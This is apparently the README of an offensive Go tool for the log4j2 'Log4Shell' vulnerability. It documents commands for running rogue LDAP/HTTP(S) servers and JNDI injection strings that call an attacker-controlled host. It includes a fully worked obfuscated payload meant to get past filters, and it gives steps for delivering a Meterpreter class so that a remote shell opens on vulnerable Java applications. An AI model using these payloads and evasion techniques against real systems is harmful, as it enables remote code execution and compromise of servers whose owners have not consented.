# Log4Shell
 * Check, exploit, obfuscate, TLS, ACME about log4j2 vulnerability in one Go program. 
 * Support common operating systems, not need install any dependency.
 * Don't need to install anything except you want to develop this project.

## Usage
 ### Start LDAP and HTTP server
   * ```Log4Shell.exe -host "1.1.1.1"```
   * ```Log4Shell.exe -host "example.com"```
 
 ### Start LDAPS and HTTPS server
   * ```Log4Shell.exe -host "example.com" -tls-server -tls-cert "cert.pem" -tls-key "key.pem"```
   * ```Log4Shell.exe -host "1.1.1.1" -tls-server -tls-cert "cert.pem" -tls-key "key.pem"``` (need IP SANs)

 ### Start LDAPS and HTTPS server with ACME
   * ```Log4Shell.exe -host "example.com" -auto-cert``` (must use domain name)

 ### Obfuscate malicious(payload) string
   ```
   Log4Shell.exe -obf "${jndi:ldap://1.1.1.1:3890/Calc}"
   ```
   ```
   raw: ${jndi:ldap://1.1.1.1:3890/Calc_27sHQFpxvwFamvBP}

   ${j${Wmmra:CaPId:-nd}${Pd:nmPbJde:vWo9b:MUDN6w:-i:l}dap${73xrLJ:ml9s81:-}${J4T2-fyx2:-:}
   /${PU1W:Ojl2xNxM:LZdr6:Rnb:-/1.}1.${R1Edku:MWjEv3bG:ZKMVOC4d5C:hxjRF:-}${5h2bPs:ItU:-1.}
   ${ogS5N:nmmhQcYA8-axELsuz03:14:-}${rP:8SL:-}${l31C:0X1Ey:-1}${NANl9M:Pfxb2obs9-PU5bDprOX
   leb-wHz:-:3}${4MyG:H2h1V2rcTu-P6IDGS4eL:Hk2e:-}${kBUQ:DWF8O:RGSKOognGm:Gcb4g:-890}${kt:R
   Nj1QL:LJq3xSbQ-QMJ:-/}${mu9nfI-wJul-thdzcWf5G-1eYs:-}C${Cw:CrVaSz-zv:-alc}_2${Pk-1FL1teD
   6OlWC:yIn6DNeu6-8UUF:-7s}${GDuei:4HWSj:Ra31Mg-PZsPG:-HQF}${myZoY-7Oko:-px}${Tc3hLd-XdMY7
   :-v}${XaDK4l:oWc:-w}${ZE-TP:-}Fa${2SuF:n465x:-m}${Cdh5xl-hblvwX4Kq:Mj:-v}BP${5V8O-CwErDR
   2Ji:UjT:-}}

   Each string can only be used once, or wait 20 seconds.
   ```
   ```
   When obfuscate malicious(payload) string, log4j2 package will repeat execute it, the
   number of repetitions is equal the number of occurrences about string "${". The LDAP
   server add a simple token mechanism for prevent it. 
   ```

## Check
 * start Log4Shell server
 * send ```${jndi:ldap://1.1.1.1:3890/Nop}```
 * send ```${jndi:ldaps://example.com:3890/Nop}``` with TLS

## Exploit
 * start Log4Shell server
 * put your class file to the payload directory
 * send ```${jndi:ldap://1.1.1.1:3890/Meterpreter}```
 * send ```${jndi:ldaps://example.com:3890/Meterpreter}``` with TLS
 * meterpreter will open source after some time

## VulApp
 * VulApp is a vulnerable Java program that use log4j2 package.
 * You can use it for develop this project easily.
 * ```java -jar vulapp.jar ${jndi:ldap://127.0.0.1:3890/Calc}```

## Help
  ```
  :::      ::::::::   ::::::::      :::     ::::::::  :::    ::: :::::::::: :::      :::
  :+:     :+:    :+: :+:    :+:    :+:     :+:    :+: :+:    :+: :+:        :+:      :+:
  +:+     +:+    +:+ +:+          +:+ +:+  +:+        +:+    +:+ +:+        +:+      +:+
  +#+     +#+    +:+ :#:         +#+  +:+  +#++:++#++ +#++:++#++ +#++:++#   +#+      +#+
  +#+     +#+    +#+ +#+   +#+# +#+#+#+#+#+       +#+ +#+    +#+ +#+        +#+      +#+
  #+#     #+#    #+# #+#    #+#       #+#  #+#    #+# #+#    #+# #+#        #+#      #+#
  ######## ########   ########        ###   ########  ###    ### ########## ######## ########

                                                        https://github.com/For-ACGN/Log4Shell

Usage of Log4Shell.exe:
  -auto-cert
        use ACME client to sign certificate automatically
  -host string
        server IP address or domain name (default "127.0.0.1")
  -http-addr string
        http server address (default ":8080")
  -http-net string
        http server network (default "tcp")
  -ldap-addr string
        ldap server address (default ":3890")
  -ldap-net string
        ldap server network (default "tcp")
  -no-token
        not add random token when use obfuscate
  -obf string
        obfuscate malicious(payload) string
  -payload string
        payload(java class) directory (default "payload")
  -tls-cert string
        tls certificate file path (default "cert.pem")
  -tls-key string
        tls private key file path (default "key.pem")
  -tls-server
        enable ldaps and https server
  ```

## Screenshot
![](https://github.com/For-ACGN/Log4Shell/raw/main/screenshot.png)
